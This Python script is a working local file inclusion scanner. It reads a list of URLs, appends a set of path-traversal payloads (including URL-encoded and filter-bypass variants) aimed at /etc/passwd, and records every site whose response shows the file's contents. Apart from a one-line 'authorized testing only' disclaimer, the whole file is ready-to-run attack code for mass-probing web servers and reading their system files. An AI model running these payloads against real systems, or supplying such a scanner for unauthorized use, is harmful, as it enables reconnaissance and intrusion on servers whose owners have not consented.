#!/usr/bin/env python3
"""
LFI /etc/passwd Exposure Checker
For authorized security testing only.
"""

import requests
import sys
import re

# Strong indicator that we got real /etc/passwd content
PASSWD_SIGNATURE = "root:x:0:0:root:/root:"

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
]

def is_valid_passwd(content: str) -> bool:
    """Check if response contains valid /etc/passwd content"""
    if PASSWD_SIGNATURE in content:
        return True
    # Fallback: look for multiple user entries
    if len(re.findall(r':\d+:\d+:', content)) >= 3:
        return True
    return False

def check_url(base_url: str):
    results = []
    candidates = [base_url]

    # Generate test URLs with traversal payloads
    for payload in LFI_PAYLOADS:
        candidates.append(base_url.rstrip("/") + "/" + payload.lstrip("/"))

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; LFIChecker/1.0)"
    }

    for url in candidates:
        try:
            resp = requests.get(url, headers=headers, timeout=8, allow_redirects=True)
            if resp.status_code == 200 and is_valid_passwd(resp.text):
                results.append((url, resp.status_code))
                break  # Stop after first success for this base URL
        except requests.RequestException:
            continue
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 check_etc_passwd.py urls.txt [output.txt]")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "etc_passwd_exposed.txt"

    vulnerable = []

    with open(input_file, "r", encoding="utf-8") as f:
        urls = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"[*] Testing {len(urls)} URLs for /etc/passwd exposure...\n")

    for url in urls:
        findings = check_url(url)
        if findings:
            for full_url, status in findings:
                print(f"[VULN] {full_url}  (Status: {status})")
                vulnerable.append(full_url)
        else:
            print(f"[SAFE] {url}")

    # Save results
    if vulnerable:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("\n".join(vulnerable) + "\n")
        print(f"\n[+] Found {len(vulnerable)} vulnerable URL(s). Saved to: {output_file}")
    else:
        print("\n[-] No /etc/passwd exposures found.")